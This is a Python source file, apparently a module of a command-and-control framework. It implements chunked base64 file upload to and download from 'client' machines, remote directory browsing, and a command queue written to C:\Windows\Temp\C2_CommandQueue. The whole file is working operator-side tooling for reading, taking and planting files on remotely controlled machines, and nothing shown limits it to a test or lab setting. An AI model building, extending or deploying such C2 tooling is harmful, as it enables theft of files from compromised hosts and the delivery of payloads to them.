#!/usr/bin/env python3
"""
Real File Operations Module
Implements actual file transfer, browsing, and management without fake data
"""

import os
import json
import time
import shutil
import hashlib
import threading
import queue
from pathlib import Path
import mimetypes
import zipfile
import tempfile
from datetime import datetime
import asyncio
import base64

class RealFileTransferManager:
    """Handles real file transfers between server and clients"""
    
    def __init__(self):
        self.active_transfers = {}
        self.transfer_history = {}
        self.upload_directory = "C:\\Windows\\Temp\\C2_Uploads"
        self.download_directory = "C:\\Windows\\Temp\\C2_Downloads"
        self.chunk_size = 8192  # 8KB chunks
        self.max_file_size = 100 * 1024 * 1024  # 100MB max
        
        # Create directories
        os.makedirs(self.upload_directory, exist_ok=True)
        os.makedirs(self.download_directory, exist_ok=True)
        
    def start_upload_to_client(self, client_id, local_file_path, remote_path):
        """Start real file upload to client"""
        try:
            if not os.path.exists(local_file_path):
                return {"status": "error", "message": "Source file not found"}
            
            file_size = os.path.getsize(local_file_path)
            if file_size > self.max_file_size:
                return {"status": "error", "message": f"File too large: {file_size} bytes"}
            
            transfer_id = self.generate_transfer_id()
            filename = os.path.basename(local_file_path)
            
            transfer_info = {
                "id": transfer_id,
                "type": "upload",
                "client_id": client_id,
                "local_path": local_file_path,
                "remote_path": remote_path,
                "filename": filename,
                "size": file_size,
                "progress": 0,
                "status": "preparing",
                "start_time": time.time(),
                "chunks_sent": 0,
                "total_chunks": (file_size // self.chunk_size) + (1 if file_size % self.chunk_size else 0)
            }
            
            self.active_transfers[transfer_id] = transfer_info
            
            # Start transfer in separate thread
            thread = threading.Thread(
                target=self._upload_worker,
                args=(transfer_id, local_file_path, client_id, remote_path)
            )
            thread.daemon = True
            thread.start()
            
            return {
                "status": "success",
                "transfer_id": transfer_id,
                "message": f"Upload started for {filename}",
                "size": file_size
            }
            
        except Exception as e:
            return {"status": "error", "message": f"Upload failed: {str(e)}"}
    
    def start_download_from_client(self, client_id, remote_file_path):
        """Start real file download from client"""
        try:
            transfer_id = self.generate_transfer_id()
            filename = os.path.basename(remote_file_path)
            local_path = os.path.join(self.download_directory, f"{client_id}_{filename}")
            
            transfer_info = {
                "id": transfer_id,
                "type": "download", 
                "client_id": client_id,
                "remote_path": remote_file_path,
                "local_path": local_path,
                "filename": filename,
                "size": 0,  # Will be updated when we get file info
                "progress": 0,
                "status": "requesting",
                "start_time": time.time(),
                "chunks_received": 0,
                "received_data": b""
            }
            
            self.active_transfers[transfer_id] = transfer_info
            
            return {
                "status": "success",
                "transfer_id": transfer_id,
                "message": f"Download requested for {filename}",
                "local_path": local_path
            }
            
        except Exception as e:
            return {"status": "error", "message": f"Download failed: {str(e)}"}
    
    def _upload_worker(self, transfer_id, local_file_path, client_id, remote_path):
        """Worker thread for uploading files"""
        try:
            transfer = self.active_transfers[transfer_id]
            transfer["status"] = "uploading"
            
            with open(local_file_path, 'rb') as f:
                chunk_num = 0
                
                while True:
                    chunk = f.read(self.chunk_size)
                    if not chunk:
                        break
                    
                    # Encode chunk as base64 for transmission
                    chunk_b64 = base64.b64encode(chunk).decode('utf-8')
                    
                    # Create chunk message
                    chunk_message = {
                        "transfer_id": transfer_id,
                        "chunk_num": chunk_num,
                        "data": chunk_b64,
                        "is_last": len(chunk) < self.chunk_size
                    }
                    
                    # Send chunk to client (this would be handled by the WebSocket server)
                    self._send_chunk_to_client(client_id, chunk_message)
                    
                    # Update progress
                    transfer["chunks_sent"] += 1
                    transfer["progress"] = int((transfer["chunks_sent"] / transfer["total_chunks"]) * 100)
                    
                    chunk_num += 1
                    time.sleep(0.01)  # Small delay to prevent overwhelming
            
            transfer["status"] = "completed"
            transfer["end_time"] = time.time()
            
            # Move to history
            self.transfer_history[transfer_id] = transfer.copy()
            
        except Exception as e:
            transfer["status"] = "error"
            transfer["error"] = str(e)
    
    def _send_chunk_to_client(self, client_id, chunk_message):
        """Send file chunk to client via command queue"""
        try:
            # Create command for client to receive file chunk
            command_dir = "C:\\Windows\\Temp\\C2_CommandQueue"
            os.makedirs(command_dir, exist_ok=True)
            
            command = {
                "client_id": client_id,
                "command": "FILE_CHUNK_RECEIVE",
                "parameters": chunk_message,
                "timestamp": time.time(),
                "source": "file_transfer_manager"
            }
            
            command_file = os.path.join(command_dir, f"filechunk_{int(time.time() * 1000)}_{client_id}.json")
            with open(command_file, 'w') as f:
                json.dump(command, f)
                
        except Exception as e:
            print(f"Error sending chunk: {e}")
    
    def process_download_chunk(self, transfer_id, chunk_data):
        """Process received chunk from client download"""
        try:
            if transfer_id not in self.active_transfers:
                return False
            
            transfer = self.active_transfers[transfer_id]
            if transfer["type"] != "download":
                return False
            
            # Decode base64 chunk
            chunk_bytes = base64.b64decode(chunk_data["data"])
            transfer["received_data"] += chunk_bytes
            transfer["chunks_received"] += 1
            
            # Update file size if this is first chunk
            if "file_size" in chunk_data and transfer["size"] == 0:
                transfer["size"] = chunk_data["file_size"]
                transfer["total_chunks"] = (transfer["size"] // self.chunk_size) + (1 if transfer["size"] % self.chunk_size else 0)
            
            # Update progress
            if transfer["total_chunks"] > 0:
                transfer["progress"] = int((transfer["chunks_received"] / transfer["total_chunks"]) * 100)
            
            # Check if download is complete
            if chunk_data.get("is_last", False):
                self._finalize_download(transfer_id)
            
            return True
            
        except Exception as e:
            if transfer_id in self.active_transfers:
                self.active_transfers[transfer_id]["status"] = "error"
                self.active_transfers[transfer_id]["error"] = str(e)
            return False
    
    def _finalize_download(self, transfer_id):
        """Finalize downloaded file"""
        try:
            transfer = self.active_transfers[transfer_id]
            
            # Write received data to file
            with open(transfer["local_path"], 'wb') as f:
                f.write(transfer["received_data"])
            
            transfer["status"] = "completed"
            transfer["end_time"] = time.time()
            transfer["actual_size"] = len(transfer["received_data"])
            
            # Verify file integrity
            if transfer["size"] > 0 and transfer["actual_size"] != transfer["size"]:
                transfer["status"] = "warning"
                transfer["warning"] = f"Size mismatch: expected {transfer['size']}, got {transfer['actual_size']}"
            
            # Clear received data from memory
            del transfer["received_data"]
            
            # Move to history
            self.transfer_history[transfer_id] = transfer.copy()
            
        except Exception as e:
            transfer["status"] = "error"
            transfer["error"] = str(e)
    
    def get_transfer_status(self, transfer_id):
        """Get current transfer status"""
        if transfer_id in self.active_transfers:
            return self.active_transfers[transfer_id].copy()
        elif transfer_id in self.transfer_history:
            return self.transfer_history[transfer_id].copy()
        else:
            return None
    
    def cancel_transfer(self, transfer_id):
        """Cancel active transfer"""
        if transfer_id in self.active_transfers:
            self.active_transfers[transfer_id]["status"] = "cancelled"
            self.transfer_history[transfer_id] = self.active_transfers[transfer_id].copy()
            del self.active_transfers[transfer_id]
            return True
        return False
    
    def get_active_transfers(self):
        """Get all active transfers"""
        return {tid: transfer.copy() for tid, transfer in self.active_transfers.items()}
    
    def get_transfer_history(self, limit=50):
        """Get transfer history"""
        history = list(self.transfer_history.values())
        history.sort(key=lambda x: x.get("start_time", 0), reverse=True)
        return history[:limit]
    
    def cleanup_old_files(self, days_old=7):
        """Clean up old transfer files"""
        cutoff_time = time.time() - (days_old * 24 * 60 * 60)
        
        for directory in [self.upload_directory, self.download_directory]:
            try:
                for filename in os.listdir(directory):
                    filepath = os.path.join(directory, filename)
                    if os.path.getmtime(filepath) < cutoff_time:
                        os.remove(filepath)
            except Exception as e:
                print(f"Cleanup error in {directory}: {e}")
    
    def generate_transfer_id(self):
        """Generate unique transfer ID"""
        return f"transfer_{int(time.time() * 1000)}_{os.urandom(4).hex()}"

class RealFileBrowser:
    """Handles real file system browsing on client machines"""
    
    def __init__(self):
        self.browser_cache = {}
        self.cache_timeout = 300  # 5 minutes
    
    def browse_client_directory(self, client_id, path="C:\\"):
        """Get real directory listing from client"""
        try:
            # Create browse request
            request_id = f"browse_{int(time.time() * 1000)}"
            
            # Send browse command to client
            command_dir = "C:\\Windows\\Temp\\C2_CommandQueue"
            os.makedirs(command_dir, exist_ok=True)
            
            command = {
                "client_id": client_id,
                "command": "FILE_BROWSE_REQUEST",
                "parameters": {
                    "request_id": request_id,
                    "path": path,
                    "include_hidden": False,
                    "max_files": 1000
                },
                "timestamp": time.time(),
                "source": "file_browser"
            }
            
            command_file = os.path.join(command_dir, f"browse_{request_id}_{client_id}.json")
            with open(command_file, 'w') as f:
                json.dump(command, f)
            
            return {
                "status": "success",
                "request_id": request_id,
                "message": f"Browse request sent for {path}"
            }
            
        except Exception as e:
            return {"status": "error", "message": f"Browse failed: {str(e)}"}
    
    def process_browse_response(self, client_id, request_id, file_list):
        """Process file browse response from client"""
        try:
            cache_key = f"{client_id}_{request_id}"
            
            processed_files = []
            for file_info in file_list:
                processed_file = {
                    "name": file_info.get("name", ""),
                    "path": file_info.get("path", ""),
                    "size": file_info.get("size", 0),
                    "is_directory": file_info.get("is_directory", False),
                    "modified_time": file_info.get("modified_time", 0),
                    "permissions": file_info.get("permissions", ""),
                    "hidden": file_info.get("hidden", False)
                }
                processed_files.append(processed_file)
            
            # Sort: directories first, then by name
            processed_files.sort(key=lambda x: (not x["is_directory"], x["name"].lower()))
            
            # Cache the results
            self.browser_cache[cache_key] = {
                "files": processed_files,
                "timestamp": time.time(),
                "client_id": client_id,
                "path": file_list[0].get("parent_path", "") if file_list else ""
            }
            
            return {
                "status": "success",
                "request_id": request_id,
                "files": processed_files,
                "count": len(processed_files)
            }
            
        except Exception as e:
            return {"status": "error", "message": f"Failed to process browse response: {str(e)}"}
    
    def get_cached_browse_result(self, client_id, request_id):
        """Get cached browse result"""
        cache_key = f"{client_id}_{request_id}"
        
        if cache_key in self.browser_cache:
            cached = self.browser_cache[cache_key]
            
            # Check if cache is still valid
            if time.time() - cached["timestamp"] < self.cache_timeout:
                return {
                    "status": "success",
                    "files": cached["files"],
                    "path": cached["path"],
                    "cached": True,
                    "cache_age": time.time() - cached["timestamp"]
                }
        
        return {"status": "pending", "message": "Browse result not ready"}
    
    def create_file_download_package(self, file_list, package_name=None):
        """Create downloadable package from multiple files"""
        try:
            if not package_name:
                package_name = f"file_package_{int(time.time())}"
            
            temp_dir = tempfile.mkdtemp()
            zip_path = os.path.join(temp_dir, f"{package_name}.zip")
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_path in file_list:
                    if os.path.exists(file_path):
                        arcname = os.path.basename(file_path)
                        zipf.write(file_path, arcname)
            
            return {
                "status": "success",
                "package_path": zip_path,
                "package_size": os.path.getsize(zip_path),
                "file_count": len(file_list)
            }
            
        except Exception as e:
            return {"status": "error", "message": f"Package creation failed: {str(e)}"}
    
    def get_file_info(self, file_path):
        """Get detailed file information"""
        try:
            if not os.path.exists(file_path):
                return {"status": "error", "message": "File not found"}
            
            stat_info = os.stat(file_path)
            
            file_info = {
                "path": file_path,
                "name": os.path.basename(file_path),
                "size": stat_info.st_size,
                "size_human": self._format_file_size(stat_info.st_size),
                "created_time": stat_info.st_ctime,
                "modified_time": stat_info.st_mtime,
                "accessed_time": stat_info.st_atime,
                "is_directory": os.path.isdir(file_path),
                "is_file": os.path.isfile(file_path),
                "extension": os.path.splitext(file_path)[1].lower(),
                "mime_type": mimetypes.guess_type(file_path)[0] or "unknown"
            }
            
            # Add file hash for integrity checking
            if file_info["is_file"] and file_info["size"] < 10 * 1024 * 1024:  # < 10MB
                file_info["md5_hash"] = self._calculate_file_hash(file_path)
            
            return {"status": "success", "file_info": file_info}
            
        except Exception as e:
            return {"status": "error", "message": f"Failed to get file info: {str(e)}"}
    
    def _format_file_size(self, size_bytes):
        """Format file size in human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size_bytes < 1024:
                return f"{size_bytes:.1f} {unit}"
            size_bytes /= 1024
        return f"{size_bytes:.1f} PB"
    
    def _calculate_file_hash(self, file_path):
        """Calculate MD5 hash of file"""
        try:
            hash_md5 = hashlib.md5()
            with open(file_path, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_md5.update(chunk)
            return hash_md5.hexdigest()
        except:
            return None

class RealFileOperationsManager:
    """Main manager for all real file operations"""
    
    def __init__(self):
        self.transfer_manager = RealFileTransferManager()
        self.browser = RealFileBrowser()
        self.operation_log = []
    
    def upload_file_to_client(self, client_id, local_file, remote_path):
        """Upload real file to client"""
        result = self.transfer_manager.start_upload_to_client(client_id, local_file, remote_path)
        
        self._log_operation("upload", client_id, {
            "local_file": local_file,
            "remote_path": remote_path,
            "result": result
        })
        
        return result
    
    def download_file_from_client(self, client_id, remote_file):
        """Download real file from client"""
        result = self.transfer_manager.start_download_from_client(client_id, remote_file)
        
        self._log_operation("download", client_id, {
            "remote_file": remote_file,
            "result": result
        })
        
        return result
    
    def browse_client_files(self, client_id, path):
        """Browse real files on client"""
        result = self.browser.browse_client_directory(client_id, path)
        
        self._log_operation("browse", client_id, {
            "path": path,
            "result": result
        })
        
        return result
    
    def get_operation_statistics(self):
        """Get real file operation statistics"""
        stats = {
            "total_operations": len(self.operation_log),
            "operations_by_type": {},
            "operations_by_client": {},
            "recent_operations": self.operation_log[-20:] if self.operation_log else []
        }
        
        for op in self.operation_log:
            op_type = op["type"]
            client_id = op["client_id"]
            
            stats["operations_by_type"][op_type] = stats["operations_by_type"].get(op_type, 0) + 1
            stats["operations_by_client"][client_id] = stats["operations_by_client"].get(client_id, 0) + 1
        
        return stats
    
    def _log_operation(self, operation_type, client_id, details):
        """Log file operation"""
        log_entry = {
            "timestamp": time.time(),
            "type": operation_type,
            "client_id": client_id,
            "details": details
        }
        
        self.operation_log.append(log_entry)
        
        # Keep only last 1000 operations
        if len(self.operation_log) > 1000:
            self.operation_log = self.operation_log[-1000:]

# Global instance
real_file_manager = RealFileOperationsManager()

# Test functions
if __name__ == "__main__":
    print("=== Real File Operations Test ===")
    
    manager = RealFileOperationsManager()
    
    # Test file info
    test_file = __file__  # This script itself
    info_result = manager.browser.get_file_info(test_file)
    if info_result["status"] == "success":
        file_info = info_result["file_info"]
        print(f"File: {file_info['name']}")
        print(f"Size: {file_info['size_human']}")
        print(f"Type: {file_info['mime_type']}")
        if file_info.get("md5_hash"):
            print(f"Hash: {file_info['md5_hash']}")
    
    # Test statistics
    stats = manager.get_operation_statistics()
    print(f"Total Operations: {stats['total_operations']}")
    
    print("Real file operations module loaded successfully")